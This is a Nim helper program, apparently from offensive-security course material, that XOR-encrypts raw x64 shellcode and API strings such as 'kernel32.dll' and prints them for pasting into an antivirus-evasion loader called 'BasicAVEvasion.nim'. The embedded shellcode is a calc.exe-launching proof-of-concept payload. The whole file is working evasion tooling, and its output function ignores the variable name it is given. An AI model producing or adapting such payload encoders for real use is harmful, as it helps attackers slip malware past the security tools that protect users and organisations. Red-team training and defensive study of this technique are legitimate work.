import std/strformat
import strutils 

# Helper program to define encrypted shellcode and strings
# Alternatively, you can use helper tools like the below to encrypt your data
# https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/Linux%20Shellcode%20Encoder/shellcodeCrypter-bin.py

# Define our key, in this case we use a single-byte key for XOR operations
# This key HAS TO match the key provided in 'BasicAVEvasion.nim' or decryption will fail
const key: uint8 = 0x37

# Helper function to XOR-encode our shellcode byte array
proc xor_encrypt[T,I](shellcode: array[T,I]): seq[byte] = 
    for i in 0..(shellcode.len-1):
        let 
            byteInt: uint8 = cast[uint8](shellcode[i])
            newByteInt: uint8 = byteInt xor key
            newByte: byte = cast[byte](newByteInt)

        result.add(newByte)

# Overload the above function to also accept a string as input
proc xor_encrypt(shellcode: string): seq[byte] =
    for i in 0..(shellcode.len-1):
        let 
            byteInt: uint8 = cast[uint8](shellcode[i])
            newByteInt: uint8 = byteInt xor key
            newByte: byte = cast[byte](newByteInt)
            
        # We still return a byte-array here because the encrypted string may contain unprintable bytes
        result.add(newByte)

# Helper function to print a byte array in the right format
proc printByteArray(varname: string, data: seq[byte]): void =
    # Print nim style array definition to STDOUT
    stdout.write(fmt"const shellcode: array[{data.len},byte] = [" & "\n")
    stdout.write("byte ")
    # Iterate through our encoded byte array to print out results
    for count in 0..(data.len-1):
        let b: byte = data[count]
        # Don't append a comma for the last bite
        if ((count+1)==data.len):
            stdout.write(fmt"{b:#04x} ]"&"\n")
        else:
            stdout.write(fmt"{b:#04x}, ")
        
        # Split the bytes evenly
        if ((count+1) mod 15 == 0):
            stdout.write("\n")

when isMainModule:
    # Define our *UNENCRYPTED* shellcode
    let 
        sc: array[296, byte] = [
            byte 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
            0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
            0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
            0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
            0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
            0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
            0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
            0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
            0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
            0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
            0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
            0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
            0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
            0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
            0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,
            0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
            0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,
            0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x43,0x3a,0x5c,
            0x77,0x69,0x6e,0x64,0x6f,0x77,0x73,0x5c,0x73,0x79,0x73,0x74,0x65,0x6d,0x33,
            0x32,0x5c,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x00
        ]

    # Encode the shellcode with our key and print it for copy-pasting into 'BasicAVEvasion.nim'
    printByteArray("scEnc", xorEncrypt(sc));

    # Define any strings that we want to encrypt
    let notepad: string = "string"

    # Encode the string with our key and print it for copy-pasting into 'BasicAVEvasion.nim'
    printByteArray("notepadenc", xor_encrypt(notepad))

    # Rinse and repeat
    let kernel32: string = "kernel32.dll"
    printByteArray("kernel32Enc", xor_encrypt(kernel32))